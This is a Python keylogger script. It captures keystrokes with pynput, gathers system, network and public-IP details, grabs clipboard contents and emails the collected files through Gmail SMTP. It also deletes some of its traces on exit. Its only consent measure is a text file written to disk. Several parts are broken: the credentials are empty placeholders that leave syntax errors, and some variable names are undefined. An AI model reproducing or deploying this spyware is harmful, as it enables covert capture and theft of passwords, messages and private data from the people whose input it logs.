import pynput, smtplib, ssl, os, platform, psutil, sys, hashlib, base64
import contextlib,time, random, win32clipboard, socket
import numpy as np
from pynput.keyboard import Key, Listener
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from datetime import datetime
from requests import get
import logging


#logging
logging.basicConfig(filename ="log.txt",
                    filemode = "a",
                    format='%(asctime)s,%(msecs)d %(message)s',
                    level=logging.INFO,
                    datefmt='%H:%M:%S')

#variables
count = 0
keys = []



#End
def notice():
    with open("notice.txt", "a") as f:
        f.write("Hello, this is made to inform you that by starting up this program, you agree to log your data.\n If you want to end this, press esc and end on your keyboard. ")
notice()        

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    logging.info(key)
    if count >= 10:
        try:
            count = 10
            write_file(keys)
            keys = []
        except Exception as e:
            print(e)


def write_file(keys):
    filename = "log.txt"
    with open(filename, "a") as f:
        for key in keys:
            try:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)
                elif k.find("enter") > 0:
                    f.write("\n")
                elif k.find("tab") > 0:
                    f.write("\t")
            except:
                pass
def send_email():
    write_file(keys)
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = #email address
    password = #password        
    recipient = #receiving mail
    subject = #subject for email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient
    message["Subject"] = subject
    body = "#body message"
    message.attach(MIMEText(body, "plain"))
    filename = "log.txt"
    attachment = open(filename,"rb")
    part = MIMEBase("Application","octet-stream")
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= "+filename)
    message.attach(part)
    text = message.as_string()
    with smtplib.SMTP_SSL(smtp_server,port) as server:
            server.login(sender_email ,password)
            server.sendmail(sender_email, recipient, text)
def get_public_address():
    filename = "system.txt"
    with open("system.txt", "a") as f:
        f.write("\n")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
            send_another(filename)
        except:
            f.write("Error")
            send_another(filename)
def send_another(filename):
    write_file(keys)
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = #email address
    password = #password        
    recipient = #receiving mail
    subject = #subject for email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient
    message["Subject"] = subject
    body = "#body message"
    message.attach(MIMEText(body, "plain"))
    attachment = open(filename,"rb")
    part = MIMEBase("Application","octet-stream")
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= "+filename)
    message.attach(part)
    text = message.as_string()
    with smtplib.SMTP_SSL(smtp_server,port) as server:
            server.login(sender ,password)
            server.sendmail(sender, receiver, text)




#writes system scan into system.txt
def write_system_info():
    value = True
    while value:
        with open("system.txt", "w") as systeminfo, contextlib.redirect_stdout(systeminfo):
            info()
            print("\n" *10)
            value = False
    filename = "system.txt"
    send_another(filename)

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    factor = 1024
    """
#scans system
def info():
    print("="*40, "System Information", "="*40)
    uname = platform.uname()
    print(f"System: {uname.system}")
    print(f"Node Name: {uname.node}")
    print(f"Release: {uname.release}")
    print(f"Version: {uname.version}")
    print(f"Machine: {uname.machine}")
    print(f"Processor: {uname.processor}")
    # Boot Time
    print("="*40, "Boot Time", "="*40)
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    print(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    # let's print CPU information
    print("="*40, "CPU Info", "="*40)
    # number of cores
    print("Physical cores:", psutil.cpu_count(logical=False))
    print("Total cores:", psutil.cpu_count(logical=True))
    # CPU frequencies
    cpufreq = psutil.cpu_freq()
    print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    # CPU usage
    print("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        print(f"Core {i}: {percentage}%")
    print(f"Total CPU Usage: {psutil.cpu_percent()}%")
    print("="*40, "Memory Information", "="*40)
    # get the memory details
    svmem = psutil.virtual_memory()
    print(f"Total: {get_size(svmem.total)}")
    print(f"Available: {get_size(svmem.available)}")
    print(f"Used: {get_size(svmem.used)}")
    print(f"Percentage: {svmem.percent}%")
    print("="*20, "SWAP", "="*20)
    # get the swap memory details (if exists)
    swap = psutil.swap_memory()
    print(f"Total: {get_size(swap.total)}")
    print(f"Free: {get_size(swap.free)}")
    print(f"Used: {get_size(swap.used)}")
    print(f"Percentage: {swap.percent}%")
    # Disk Information
    print("="*40, "Disk Information", "="*40)
    print("Partitions and Usage:")
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        print(f"=== Device: {partition.device} ===")
        print(f"  Mountpoint: {partition.mountpoint}")
        print(f"  File system type: {partition.fstype}")
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        print(f"  Total Size: {get_size(partition_usage.total)}")
        print(f"  Used: {get_size(partition_usage.used)}")
        print(f"  Free: {get_size(partition_usage.free)}")
        print(f"  Percentage: {partition_usage.percent}%")
    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    print(f"Total read: {get_size(disk_io.read_bytes)}")
    print(f"Total write: {get_size(disk_io.write_bytes)}")
    # Network information
    print("="*40, "Network Information", "="*40)
    # get all network interfaces (virtual and physical)
    if_addrs = psutil.net_if_addrs()
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            print(f"=== Interface: {interface_name} ===")
            if str(address.family) == 'AddressFamily.AF_INET':
                print(f"  IP Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast IP: {address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                print(f"  MAC Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast MAC: {address.broadcast}")
    # get IO statistics since boot
    net_io = psutil.net_io_counters()
    print(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    print(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")
#grabs clipboard info
def clipboards():
    with open("clipboards.txt","a") as clip:
        try:
            data = None
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clip.write("Clipboard data: \n" + data)
        except Exception as clip:
            print(clip)
            
            
#ends program
def on_release(key):
    if key == Key.end:
        send_email()
        try:
            clipboards()
            os.remove("notice.txt")
            os.remove("clipboards.txt")
            os.remove("system.txt")
            return False
        except Exception as e:
                f.write(e)
                return False
        finally:
            return False
          
 
with Listener(on_press=on_press, on_release=on_release) as listener:
    write_system_info()
    get_public_address()
    listener.join()





